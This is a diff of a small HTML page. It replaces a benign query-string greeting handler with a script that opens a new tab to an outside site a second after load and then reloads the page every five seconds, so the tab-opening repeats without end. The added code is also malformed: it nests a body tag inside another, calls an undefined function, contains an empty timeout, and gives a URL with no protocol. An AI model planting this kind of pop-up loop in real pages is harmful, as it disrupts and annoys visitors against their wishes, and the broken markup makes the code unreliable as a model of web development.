@@ -1,21 +1,28 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>HTTP GET Request Handler</title>
-  </head>
-  <body>
-    <script>
-      // Get the query string from the URL
-      const queryString = window.location.search;
-      
-      // Check if the query string matches a specific value
-      if (queryString === '?name=John') {
-        // If the query string matches, return a specific string
-        document.write('Hello John!');
-      } else {
-        // If the query string doesn't match, return an error message
-        document.write('Error: Invalid request.');
-      }
-    </script>
-  </body>
+<head>
+<title>X</title>
+</head>
+<body>
+	<body onload="redirect()">
+
+<script>
+	
+function openTabs() {
+ setTimeout(function() {
+  window.open('serainox420.github.io', '_blank');
+  setTimeout(function() {
+    }, 1000); // 1 second delay
+  }, 1000); // 1 second delay
+}
+
+window.onload = function() {
+  openTabs();
+  setTimeout(function() {
+    location.reload();
+  }, 5000); // 5 second delay
+};
+</script>
+</div>
+</body>
 </html>
